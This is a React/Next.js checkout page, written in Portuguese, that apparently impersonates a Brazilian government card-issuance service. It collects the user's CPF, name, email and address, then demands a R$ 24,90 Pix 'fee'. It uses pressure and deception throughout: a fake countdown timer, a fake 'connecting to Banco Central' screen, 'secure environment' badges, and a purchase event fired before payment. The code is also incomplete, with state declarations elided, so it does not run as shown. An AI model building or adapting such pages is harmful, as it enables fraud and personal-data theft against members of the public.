"use client";

import { GovHeader } from "@/components/GovHeader";
import { CheckCircle2, MapPin, Truck, QrCode, Copy, Check, Lock } from "lucide-react";
import { useState, useEffect } from "react";
import Image from "next/image";
import { useSearchParams } from "next/navigation";

import { getSessionId } from "@/lib/session";

// Helper Component for Timer
function CountdownTimer() {
    const [time, setTime] = useState(15 * 60); // 15 minutes

    useEffect(() => {
        const timer = setInterval(() => {
            setTime(t => t > 0 ? t - 1 : 0);
        }, 1000);
        return () => clearInterval(timer);
    }, []);

    const minutes = Math.floor(time / 60);
    const seconds = time % 60;

    return (
        <span className={`font-mono font-bold ${time < 60 ? 'text-red-400' : 'text-slate-200'}`}>
            {minutes.toString().padStart(2, '0')}:{seconds.toString().padStart(2, '0')}
        </span>
    );
}

// Internal component with the logic requiring useSearchParams
function EntregaContent() {
    useEffect(() => {
        // Analytics Tracker
        fetch('/api/analytics', {
            method: 'POST',
            body: JSON.stringify({
                step: 'payment_page_view',
                sessionId: getSessionId()
            })
        }).catch(e => console.error(e));

        // META ADS: InitiateCheckout
        if (typeof window !== 'undefined' && window.fbq) {
            window.fbq('track', 'InitiateCheckout');
        }
    }, []);

    const [cep, setCep] = useState("");
    // ... (rest of code)
    const handleGeneratePix = async () => {
        setLoadingPix(true);
        setShowModal(true); // Open modal immediately

        // META ADS: Purchase (Optimistic trigger on intent)
        if (typeof window !== 'undefined' && window.fbq) {
            window.fbq('track', 'Purchase', {
                value: 24.90,
                currency: 'BRL',
                content_name: 'Taxa de Emissao Cartao',
            });
        }

        try {
            const res = await fetch('/api/checkout', {
                method: 'POST',
                body: JSON.stringify({
                    nome,
                    cpf,
                    email,
                    phone: "11999999999", // Sending dummy phone to satisfy gateway validation
                    address: {
                        street: address.logradouro,
                        number: "123", // Using placeholder if not captured, but ideally should be address.numero
                        neighborhood: address.bairro,
                        city: address.localidade,
                        state: address.uf,
                        zipCode: cep
                    }
                })
            });
            const data = await res.json();
            if (data.success) {
                setPixData(data);
                setShowPix(false); // Reset internal QR toggle
            } else {
                // Keep modal open but show error state (handled by rendering logic)
                setPixData(null);
                alert(`Erro ao gerar PIX: ${data.error || "Tente novamente."}`);
                setShowModal(false); // Close modal on error for now to let them retry or we can show error inside
            }
        } catch (error) {
            console.error(error);
            alert("Erro de conexão.");
            setShowModal(false);
        } finally {
            setLoadingPix(false);
        }
    };

    const formatCep = (value: string) => {
        return value
            .replace(/\D/g, '')
            .replace(/(\d{5})(\d)/, '$1-$2')
            .slice(0, 9);
    };

    const handleCepChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
        const value = formatCep(e.target.value);
        setCep(value);

        if (value.length === 9) {
            setLoadingCep(true);
            try {
                const cleanCep = value.replace(/\D/g, '');
                const res = await fetch(`https://viacep.com.br/ws/${cleanCep}/json/`);
                const data = await res.json();
                if (!data.erro) {
                    setAddress(data);
                    setAddressValid(true);
                } else {
                    setAddressValid(false);
                }
            } catch (error) {
                console.error("Erro ao buscar CEP", error);
            } finally {
                setLoadingCep(false);
            }
        } else {
            setAddressValid(false);
        }
    };

    const confirmAddress = () => {
        if (addressValid) {
            setStep(2);
            setTimeout(() => {
                document.getElementById('shipping-section')?.scrollIntoView({ behavior: 'smooth' });
            }, 100);
        } else {
            alert("Por favor, informe um CEP válido válido para continuar.");
        }
    };

    const selectShipping = () => {
        setShippingSelected(true);
        setTimeout(() => {
            setStep(3);
            document.getElementById('payment-section')?.scrollIntoView({ behavior: 'smooth' });
        }, 500);
    };

    return (
        <>
            <div className="max-w-xl mx-auto">

                <div className="mb-8 text-center">
                    <h1 className="text-2xl font-bold text-slate-900 mb-2">Finalizar Solicitação</h1>
                    <p className="text-slate-500 text-sm">Confirme o endereço para envio do cartão físico.</p>
                </div>

                {/* STEP 1: ADDRESS */}
                <div className={`bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden mb-6 transition-all duration-300 ${step > 1 ? 'opacity-80' : 'opacity-100 ring-4 ring-blue-50'}`}>
                    <div className="p-6 border-b border-slate-100 flex justify-between items-center bg-slate-50/50">
                        <div className="flex items-center gap-3">
                            <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm ${step > 1 ? 'bg-green-100 text-green-700' : 'bg-gov-blue-600 text-white'}`}>
                                {step > 1 ? <Check className="h-5 w-5" /> : '1'}
                            </div>
                            <h3 className="font-bold text-slate-800">Endereço de Entrega</h3>
                        </div>
                        {step > 1 && (
                            <button onClick={() => setStep(1)} className="text-xs text-gov-blue-600 hover:underline">Editar</button>
                        )}
                    </div>

                    {step === 1 && (
                        <div className="p-6 space-y-4 animate-in slide-in-from-top-2">
                            <div className="grid grid-cols-2 gap-4">
                                <div>
                                    <label className="block text-xs font-bold text-slate-500 uppercase mb-1">CEP</label>
                                    <input
                                        value={cep}
                                        onChange={handleCepChange}
                                        placeholder="00000-000"
                                        maxLength={9}
                                        className="w-full p-3 border border-slate-200 rounded-lg focus:ring-2 focus:ring-gov-blue-600 outline-none transition-all font-semibold"
                                    />
                                </div>
                                <div className="flex items-end">
                                    <a href="https://buscacepinter.correios.com.br/app/endereco/index.php" target="_blank" className="text-gov-blue-600 text-xs font-medium hover:underline mb-3 ml-2 flex items-center gap-1">
                                        Não sei meu CEP
                                    </a>
                                </div>
                            </div>

                            {loadingCep && <p className="text-xs text-blue-600 animate-pulse flex items-center gap-2"><div className="w-2 h-2 bg-blue-600 rounded-full animate-bounce" /> Buscando endereço...</p>}

                            {/* Address Fields - Always Visible but Disabled until valid */}
                            <div className={`space-y-3 transition-opacity duration-300 ${addressValid ? 'opacity-100' : 'opacity-60 grayscale'}`}>
                                <div>
                                    <label className="block text-xs font-bold text-slate-500 uppercase mb-1">Rua / Logradouro</label>
                                    <input
                                        value={address.logradouro}
                                        readOnly
                                        placeholder="Endereço não encontrado"
                                        className="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg text-slate-700 font-medium cursor-not-allowed"
                                    />
                                </div>
                                <div className="grid grid-cols-3 gap-3">
                                    <div className="col-span-1">
                                        <label className="block text-xs font-bold text-slate-500 uppercase mb-1">Número</label>
                                        <input
                                            placeholder="Nº"
                                            disabled={!addressValid}
                                            className="w-full p-3 border border-slate-200 rounded-lg focus:ring-2 focus:ring-gov-blue-600 outline-none disabled:bg-slate-50"
                                        />
                                    </div>
                                    <div className="col-span-2">
                                        <label className="block text-xs font-bold text-slate-500 uppercase mb-1">Bairro</label>
                                        <input
                                            value={address.bairro}
                                            readOnly
                                            placeholder="Bairro"
                                            className="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg text-slate-700 cursor-not-allowed"
                                        />
                                    </div>
                                </div>
                                <div className="grid grid-cols-3 gap-3">
                                    <div className="col-span-2">
                                        <label className="block text-xs font-bold text-slate-500 uppercase mb-1">Cidade</label>
                                        <input
                                            value={address.localidade}
                                            readOnly
                                            placeholder="Cidade"
                                            className="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg text-slate-700 cursor-not-allowed"
                                        />
                                    </div>
                                    <div className="col-span-1">
                                        <label className="block text-xs font-bold text-slate-500 uppercase mb-1">UF</label>
                                        <input
                                            value={address.uf}
                                            readOnly
                                            placeholder="UF"
                                            className="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg text-slate-700 cursor-not-allowed"
                                        />
                                    </div>
                                </div>

                                <button
                                    onClick={confirmAddress}
                                    disabled={!addressValid}
                                    className={`
                                            w-full mt-6 text-white font-bold py-4 rounded-xl shadow-md transition-all active:scale-95 flex items-center justify-center gap-2
                                            ${addressValid ? 'bg-gov-green-600 hover:bg-gov-green-700' : 'bg-slate-300 cursor-not-allowed'}
                                        `}
                                >
                                    Continuar para Opções de Envio
                                </button>
                            </div>
                        </div>
                    )}

                    {step > 1 && addressValid && (
                        <div className="p-4 px-6 text-sm text-slate-600 bg-slate-50 flex justify-between items-center">
                            <span>{address.logradouro}, {address.bairro} - {address.localidade}/{address.uf}</span>
                        </div>
                    )}
                </div>

                {/* STEP 2: SHIPPING METHOD */}
                {step >= 2 && (
                    <div id="shipping-section" className={`bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden mb-6 transition-all duration-500 ${step === 2 ? 'ring-4 ring-blue-50 opacity-100' : step > 2 ? 'opacity-80' : 'opacity-50 blur-sm'}`}>
                        <div className="p-6 border-b border-slate-100 flex items-center gap-3 bg-slate-50/50">
                            <div className={`w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm ${step > 2 ? 'bg-green-100 text-green-700' : step === 2 ? 'bg-gov-blue-600 text-white' : 'bg-slate-200 text-slate-500'}`}>
                                {step > 2 ? <Check className="h-5 w-5" /> : '2'}
                            </div>
                            <h3 className="font-bold text-slate-800">Método de Envio</h3>
                        </div>

                        {(step === 2 || step === 3) && (
                            <div className="p-6 animate-in slide-in-from-bottom-4">
                                <div
                                    onClick={step === 2 ? selectShipping : undefined}
                                    className={`
                                            relative border-2 rounded-xl overflow-hidden cursor-pointer transition-all hover:shadow-md group flex
                                            ${shippingSelected ? 'border-green-500 bg-green-50/30 ring-4 ring-green-100' : 'border-slate-200 hover:border-green-400'}
                                        `}
                                >
                                    {/* Official Logo Only - No Box Container */}
                                    <div className="w-24 bg-white flex items-center justify-center p-2 border-r border-slate-100">
                                        <img
                                            src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Correios_%282014%29.svg/1920px-Correios_%282014%29.svg.png"
                                            alt="Correios"
                                            className="w-full h-auto object-contain"
                                        />
                                    </div>

                                    <div className="flex-1 p-4">
                                        <div className="flex justify-between items-start mb-1">
                                            <div>
                                                <h4 className="font-bold text-slate-900 text-sm md:text-base">Carta Registrada + AR</h4>
                                                <p className="text-xs text-slate-500">Entrega garantida em mão própria</p>
                                            </div>
                                            <div className="text-right">
                                                <span className="block font-bold text-gov-green-700 text-lg">R$ 24,90</span>
                                            </div>
                                        </div>

                                        <div className="flex items-center gap-2 mt-2">
                                            <span className="text-[10px] text-slate-500 bg-slate-100 px-2 py-1 rounded-full flex items-center gap-1">
                                                <Lock className="h-3 w-3" /> Rastreado
                                            </span>
                                            <span className="text-[10px] text-green-700 bg-green-50 px-2 py-1 rounded-full font-bold">
                                                2 a 3 dias úteis
                                            </span>
                                        </div>
                                    </div>

                                    {shippingSelected && (
                                        <div className="absolute top-2 right-2 bg-gov-blue-600 text-white p-1 rounded-full shadow-md animate-in zoom-in">
                                            <CheckCircle2 className="h-4 w-4" />
                                        </div>
                                    )}
                                </div>
                            </div>
                        )}
                    </div>
                )}

                {/* STEP 3: PAYMENT */}
                {step >= 3 && (
                    <div id="payment-section" className="bg-white rounded-2xl shadow-xl border border-slate-200 overflow-hidden animate-in slide-in-from-bottom-8 duration-700">
                        <div className="p-6 border-b border-slate-100 flex items-center gap-3 bg-slate-50/50">
                            <div className="w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm bg-gov-blue-600 text-white">
                                3
                            </div>
                            <h3 className="font-bold text-slate-800">Pagamento Seguro</h3>
                        </div>

                        <div className="p-8 text-center">
                            <div className="mb-6">
                                <p className="text-sm text-slate-600 mb-2">Valor Total a Pagar:</p>
                                <div className="text-4xl font-extrabold text-gov-green-600 tracking-tight">R$ 24,90</div>
                            </div>

                            <button
                                onClick={handleGeneratePix}
                                disabled={loadingPix}
                                className="w-full bg-gov-green-600 hover:bg-gov-green-700 text-white font-bold py-4 rounded-xl shadow-lg shadow-green-900/20 transition-all flex items-center justify-center gap-2 group transform active:scale-95 disabled:opacity-70 disabled:cursor-not-allowed"
                            >
                                <QrCode className="h-5 w-5" />
                                {loadingPix ? "Gerando..." : "Gerar PIX para Pagamento"}
                            </button>

                            <div className="mt-8 flex items-center justify-center gap-4 opacity-60 grayscale hover:grayscale-0 transition-all">
                                <img src="https://upload.wikimedia.org/wikipedia/commons/d/de/Logo_-_pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.png" className="h-6" alt="Pix" />
                            </div>
                        </div>
                    </div>
                )}

                {/* PAYMENT MODAL */}
                {showModal && (
                    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
                        {/* Backdrop */}
                        <div className="absolute inset-0 bg-black/60 backdrop-blur-sm animate-in fade-in" onClick={() => !loadingPix && setShowModal(false)}></div>

                        {/* Modal Content */}
                        <div className="bg-white rounded-3xl shadow-2xl w-full max-w-md relative z-10 overflow-hidden animate-in zoom-in-95 duration-300 font-sans">
                            {loadingPix ? (
                                <div className="p-12 text-center">
                                    <div className="relative w-24 h-24 mx-auto mb-6">
                                        <div className="absolute inset-0 border-4 border-slate-100 rounded-full"></div>
                                        <div className="absolute inset-0 border-4 border-gov-green-500 rounded-full border-t-transparent animate-spin"></div>
                                        <div className="absolute inset-0 flex items-center justify-center">
                                            <Lock className="h-8 w-8 text-gov-green-600 animate-pulse" />
                                        </div>
                                    </div>
                                    <h3 className="text-xl font-bold text-slate-800 mb-2">Conectando ao Banco Central...</h3>
                                    <p className="text-slate-500 text-sm">Gerando chave de segurança única</p>
                                </div>
                            ) : pixData ? (
                                <div className="flex flex-col max-h-[90vh]">
                                    {/* Premium Header */}
                                    <div className="bg-slate-900 p-6 text-center shrink-0 relative overflow-hidden">
                                        {/* Background Pattern */}
                                        <div className="absolute inset-0 opacity-10 bg-[url('https://www.transparenttextures.com/patterns/cubes.png')]"></div>

                                        <div className="relative z-10">
                                            <div className="inline-flex items-center gap-2 bg-white/10 backdrop-blur-sm px-3 py-1 rounded-full text-green-400 text-xs font-bold mb-4 border border-white/10">
                                                <Lock className="h-3 w-3" />
                                                Ambiente 100% Seguro
                                            </div>
                                            <h3 className="text-white font-bold text-2xl mb-1">Pagamento da Taxa</h3>
                                            <div className="flex justify-center items-center gap-2 text-slate-400 text-sm">
                                                <span>Reserva válida por:</span>
                                                <CountdownTimer />
                                            </div>
                                        </div>
                                    </div>

                                    {/* Modal Body */}
                                    <div className="p-6 overflow-y-auto space-y-6">

                                        {/* Value Display */}
                                        <div className="text-center">
                                            <p className="text-sm text-slate-500 mb-1">Valor do Envio + Emissão</p>
                                            <p className="text-4xl font-extrabold text-slate-800 tracking-tight">R$ 24,90</p>
                                        </div>

                                        {/* Copia e Cola Section (Review Focus) */}
                                        <div className="space-y-3">
                                            <div className="flex items-center gap-2 text-sm font-bold text-slate-700">
                                                <div className="w-6 h-6 rounded-full bg-gov-blue-100 text-gov-blue-600 flex items-center justify-center text-xs">1</div>
                                                Copie o código abaixo
                                            </div>

                                            <div className="relative group">
                                                <div className="absolute inset-0 bg-gov-green-500/5 rounded-xl blur-sm group-hover:bg-gov-green-500/10 transition-all"></div>
                                                <div className="relative bg-white border-2 border-slate-200 rounded-xl overflow-hidden flex shadow-sm group-hover:border-gov-green-500 transition-colors">
                                                    <input
                                                        value={pixData.qr_code_text}
                                                        readOnly
                                                        className="flex-1 pl-4 py-4 text-xs font-mono text-slate-500 bg-transparent outline-none"
                                                    />
                                                    <button
                                                        onClick={() => {
                                                            navigator.clipboard.writeText(pixData.qr_code_text);
                                                            alert("Código PIX copiado com sucesso!");
                                                            // Track copy event
                                                            fetch('/api/solicitations', {
                                                                method: 'POST',
                                                                body: JSON.stringify({
                                                                    cpf,
                                                                    metadata: { pix_copied: true }
                                                                })
                                                            }).catch(e => console.error("Track error", e));
                                                        }}
                                                        className="bg-gov-green-600 hover:bg-gov-green-700 text-white font-bold text-sm px-6 transition-colors flex items-center gap-2"
                                                    >
                                                        <Copy className="h-4 w-4" />
                                                        Copiar
                                                    </button>
                                                </div>
                                            </div>
                                        </div>

                                        <div className="space-y-3">
                                            <div className="flex items-center gap-2 text-sm font-bold text-slate-700">
                                                <div className="w-6 h-6 rounded-full bg-gov-blue-100 text-gov-blue-600 flex items-center justify-center text-xs">2</div>
                                                Pague no app do seu banco
                                            </div>
                                            <p className="text-xs text-slate-500 ml-8 leading-relaxed">
                                                Abra o aplicativo do seu banco, escolha a opção <strong>Pix Copia e Cola</strong> e cole o código copiado.
                                            </p>
                                        </div>

                                        <div className="h-px bg-slate-100"></div>

                                        {/* QR Code Toggle */}
                                        <div className="text-center">
                                            {!showPix ? (
                                                <button
                                                    onClick={() => setShowPix(true)}
                                                    className="text-slate-500 text-xs font-medium hover:text-gov-blue-600 flex items-center justify-center gap-2 w-full py-2 transition-colors"
                                                >
                                                    <QrCode className="h-3 w-3" />
                                                    Prefiro escanear o QR Code
                                                </button>
                                            ) : (
                                                <div className="animate-in slide-in-from-top-2 fade-in">
                                                    <div className="bg-white p-2 rounded-xl border border-slate-100 inline-block shadow-sm mb-2">
                                                        <img
                                                            src={`data:image/png;base64,${pixData.qr_code_base64}`}
                                                            className="w-40 h-40 object-contain opacity-90"
                                                            alt="Pix QR Code"
                                                        />
                                                    </div>
                                                </div>
                                            )}
                                        </div>

                                        {/* Policy Disclaimer - SUBTLE */}
                                        <div className="bg-slate-50 p-4 rounded-xl text-center">
                                            <p className="text-[11px] text-slate-400 leading-relaxed max-w-xs mx-auto">
                                                <span className="font-semibold text-slate-500">Importante:</span> O não pagamento dentro do prazo de reserva resultará no cancelamento automático desta solicitação.
                                            </p>
                                            <p className="text-[10px] text-slate-300 mt-2">
                                                Nova análise disponível apenas após 60 dias.
                                            </p>
                                        </div>
                                    </div>

                                    {/* Modal Footer */}
                                    <div className="p-4 border-t border-slate-100 bg-slate-50/50 shrink-0">
                                        <button
                                            onClick={() => setShowModal(false)}
                                            className="w-full py-3 text-slate-500 font-bold hover:bg-slate-200 hover:text-slate-700 rounded-xl transition-all text-sm"
                                        >
                                            Fechar
                                        </button>
                                        <div className="mt-4 flex justify-center items-center gap-4 opacity-50 grayscale">
                                            <div className="flex items-center gap-1 text-[10px] text-slate-400 font-bold">
                                                <Lock className="h-3 w-3" /> PROCESSO SEGURO
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            ) : (
                                // Error State
                                <div className="p-8 text-center">
                                    <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                                        <Lock className="h-8 w-8 text-red-500" />
                                    </div>
                                    <h3 className="text-lg font-bold text-slate-800">Erro ao gerar</h3>
                                    <p className="text-slate-500 text-sm mb-6">Não foi possível criar o pagamento agora.</p>
                                    <button onClick={() => setShowModal(false)} className="px-6 py-2 bg-slate-900 text-white rounded-lg">Tentar Novamente</button>
                                </div>
                            )}
                        </div>
                    </div>
                )}

            </div>
        </>
    );
}

// Just export the Suspense Wrapper
import { Suspense } from "react";

export default function EntregaPage() {
    return (
        <div className="min-h-screen bg-slate-50 flex flex-col font-sans text-slate-900">
            <GovHeader />

            <main className="flex-1 container-centered py-10 pb-24">
                <Suspense fallback={
                    <div className="flex justify-center items-center h-48 text-blue-600 gap-2">
                        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-current"></div>
                        <p className="text-sm font-bold animate-pulse">Carregando dados...</p>
                    </div>
                }>
                    <EntregaContent />
                </Suspense>
            </main>
        </div>
    );
}
